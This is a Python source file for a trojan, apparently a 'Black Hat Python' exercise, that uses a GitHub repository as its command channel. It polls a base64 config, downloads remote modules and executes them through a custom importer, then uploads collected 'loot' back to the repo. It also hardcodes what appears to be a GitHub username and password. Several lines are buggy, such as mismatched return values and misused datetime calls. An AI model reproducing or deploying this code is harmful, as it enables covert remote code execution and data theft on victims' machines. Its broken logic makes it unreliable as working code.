#!/usr/bin/python3
import sys, os
import datetime, random, imp
import threading, queue
import base64

from simplejson import loads
from github3 import login

ID="test"
GIT_URL="http://github.com/iwakura1ain/BlackHatPython-Examples"

CONFIG_DIR="trojan_command/config/trojan_conf.json"
CONFIG=[]

LOOT_DIR="trojan_command/loot/%s/" % ID
LOOT_NUM = 1

MODULE_DIR="trojan_command/modules"

TROJAN_MODULES=[]
TASK_QUEUE=queue.Queue()


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        new_module = GetFile(path + "/" + name)
        if new_module is not None:
            self.current_module_code = base64.b64decode(new_module)
            return True
        else:
            return False

    def load_module(self, name):
        module = imp.new_module(name)
        exec(self.current_module_code) in module.__dict__

class TaskSyncer:
    def __init__(self):
        self.running_tasks = set()
        self.running_threads = dict()

    def SyncTasks(self, new_tasks):
        new_tasks = set()
        new_threads = dict()

        #sync new tasks and reuse old threads
        for task in new_tasks:
            new_tasks.add(task)
            if task in self.running_tasks:  #task was previously running
                #reuse previously running thread
                new_threads[task["name"]] = self.running_threads[task["name"]]
                
            else:  #brand new task
                #brand new thread entry
                t = threading.Thread(target=RunModule,
                                     args=(task["name"], task["args"],))

                new_threads[task["name"]] = t

        #stop unused old threads
        for t in self.running_threads:
            if t not in new_threads:
                t._stop()

        self.running_tasks = new_tasks
        self.running_threads = new_threads

    def RunAll(self):
        for t in self.running_threads:
            try:
                t.start()
            except RuntimeError: #reused old thread
                continue
                  
def RunModule(module, args):
    result = sys.modules[module].run(args)
    StoreLoot(result)
    return
        
def ConnectToGithub():
    gh = login(username="iwakura1ain", password="912ehd406gh")
    repo = gh.repository("iwakura1ain", "BlackHatPython-Examples")
    #branch = repo.branch("main")

    return gh,repo

def GetFile(dir):
    gh, repo  = ConnectToGithub()
    f = repo.file_contents(dir)
    
    return f

def GetConfig():
    global CONFIG
    
    importer = GitImporter()
    scheduled_modules = set()

    while True:
        datetime.time.sleep(random.randint(1,10))
        
        config = loads(base64.b64decode(GetFile(CONFIG_DIR).contents)) #simplejson, base64 used
        if(CONFIG != config):
            CONFIG = config
            print("New taskset received!")
            
            for task in CONFIG:
                mod = task["module"]
                
                if(mod not in TROJAN_MODULES):
                    print("Requires module import...")
                    if importer.find_module(mod):
                        importer.load_module(mod)
                        TROJAN_MODULES.append(mod)
                                                
                    else:
                        print("Module not found...")
                        continue
                
                new_task = {"name":task["module"], "args":task["args"]}
                scheduled_modules.add(new_task)
                    
            return scheduled_modules
        
def StoreLoot(loot):
    global LOOT_NUM
    
    gh, repo, branch = ConnectToGithub()
    remote_path = "%s/%d-%s.txt" % (LOOT_DIR, LOOT_NUM, datetime.time.strftime("%H%M"))
    repo.create_file(remote_path, datetime.date.strftime("%Y-%m-%d"), base64.b64encode(loot))
    LOOT_NUM += 1

    return

def main():
    sys.meta_path = [GitImporter()]
    running_modules = TaskSyncer()
    
    while True:
        scheduled_modules = GetConfig() #blocks until new config is loaded
        running_modules.SyncTasks(scheduled_modules) 
        running_modules.RunAll()
        
        
    
    
    
if __name__=="__main__":
    main()
    
                
        

    
